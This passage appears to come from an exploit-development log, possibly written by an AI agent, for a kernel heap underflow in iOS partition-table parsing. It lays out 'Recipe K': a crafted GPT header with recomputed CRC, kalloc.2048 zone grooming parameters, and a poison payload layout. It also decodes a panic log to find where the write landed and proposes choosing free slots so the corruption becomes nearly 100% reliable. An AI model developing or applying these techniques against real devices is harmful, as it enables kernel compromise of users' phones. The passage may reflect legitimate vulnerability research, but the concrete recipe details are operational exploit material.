  * `panic_on_cs_killed` @0xfffffff008774b34 is S_ZEROFILL, so 0, and boot-args
    are unreachable on this build: **a code-signing failure KILLS THE PROCESS,
    not the machine.** A botched CD-buffer edit costs a process, not a boot.
  * **Boot-loop hazard**: `ubc_cs_blob_revalidate` re-runs `cs_validate_csblob`
    over an EDITED buffer, so any damage to magic/length/hashOffset/nCodeSlots/
    hashType/pageSize returns 0x55 EBADEXEC instead of 0x23 EAGAIN, and the job
    then fails **permanently on every respawn**.
  * **DO NOT touch `csb_flags` (+0x0c) or `csb_platform_binary` (+0xa8 bit 0)** —
    both are compared in the re-exec dup check -> 0x25 EALREADY -> permanent exec
    failure.
  * **HARD SAFETY RULE, carried over verbatim**: if a `/bin/sh` chain is ever
    used, `argv = ["sh","-c",<string>]`, so **`nvram` must NEVER be the binary
    placed at `/bin/sh`** — `argv[1] == "-c"` and `nvram -c` CLEARS NVRAM.
  * Their §12 second door: `IOApplePartitionScheme` LOOPS with **no checksum at
    all** — gate is a `"PM"` halfword, loop count is `pmMapBlkCnt`, ours. It
    yields N controlled alloc/free cycles, though still only one underflow write
    (a failed read ends the loop at 0xfffffff007cd070c).

### R88.4 — RECIPE K (job 683, armed, CHECKPOINT PASSED, 16,153 B)

First recipe built to their spec, and the first whose write is BOUNDED:

    GPT bait   sectors 0-15 RAW (type 1 -> no victim, no write): J's proven
               protective MBR (0xEE) + GPT header, retuned and RE-CRC'd by me:
               PartitionEntryLBA 64, NumberOfEntries 12, SizeOfEntry 128
               -> array = 1,536 B = 3 sectors ; HeaderCRC32 = 0x00779aea,
               recomputed independently and matching, and the scheme's own
               SizeOfEntry gate ((ESZ-0x80)>>7 = 0 <= 0x1fe) satisfied.
    victim     dbr = 4 -> allocSize **2048** -> kalloc.2048, **N=8 per chunk**
    table      runCount 45 -> 0xf4+40*45 = **2,044 B -> ALSO kalloc.2048**, and

    poison     zlib at sector 64, 3 sectors (1,536 < 2,048 strictly), L = 4,096
    **L = 2 x allocSize, so the write covers EXACTLY one neighbour plus the
    victim. It cannot leave the 16 KB chunk, cannot reach zone metadata, and
    cannot reach another zone.** Every previous recipe could and did.
    payload    size base 0x1800 (J used 0x1000/0x1400) and word3 tag 0x64XXXXXX,
               so neither a stale J log nor our own H/I logs can masquerade.

Predictions, all three informative, and the first two test THEIR model:

    Panicked task pid 26: wifiFirmwareLoader

    high 32 = 0x1820      -> size base **0x1800** | (k>>4) = 0x20  ->  k = 512
(0x1800 is Recipe K's base; J used 0x1000/0x1400, H/I used a different field
position entirely, so this cannot be a stale log.)
`expected ^ found == bits changed` checks out exactly (0x5e352ca7e4dba38f).

### R89.2 — The geometry closes, and it lands on their ONE named failure mode

    k = 512, element base 0xfffffff06554ca00
    dst = elem - k           = 0xfffffff06554c800
    V   = dst + (L-allocSize)= 0xfffffff06554d000
    If kalloc.768's chunk is 3 pages (12,288 B, 16 elements):
      chunk base B = 0xfffffff06554a000 (4 KiB aligned), elem = B + 14*768 (index 14/16)
      chunk spans [0xfffffff06554a000, **0xfffffff06554d000**)
      and V == that chunk's END, exactly.
      dst = B + 10,240 = inside element index 13.

**So the victim landed at index 0 of its own kalloc.2048 chunk, and the 2,048
bytes below it were the TAIL OF AN ADJACENT kalloc.768 CHUNK.** Our write began
mid-element-13 of that chunk and our byte k=512 landed precisely on element-14's
base - the freelist cookie word.

That is **GROOM-ORDER's explicitly named sole failure mode**: "sole failure mode
is the victim landing at chunk index 0", 1-in-8 at N=8. We hit it first try. This
does **not** contradict their model - it lands on the one case they said would
break it, and the detector behaved exactly as they said it would.

### R89.3 — A claim of MINE, falsified; and the refinement it buys

**R88.4 claimed "L = 2*allocSize ... cannot leave the 16 KB chunk, cannot reach
zone metadata, and cannot reach another zone." That is TRUE for chunk indices
1..7 and FALSE at index 0.** Retracting the unconditional form. A downward write
of exactly one element-width escapes the chunk precisely when the victim is the
chunk's first element.

The refinement, and it is a genuine improvement on the plan: with 7 groom
objects we do not merely obtain adjacency - **we choose WHICH slot stays free.**
Leave a NON-ZERO index free and the index-0 failure mode is removed entirely,
taking GROOM-ORDER's 87.5% to ~100% and making the bounded-write property
unconditional. Worth passing to the app-session for their recipe spec.
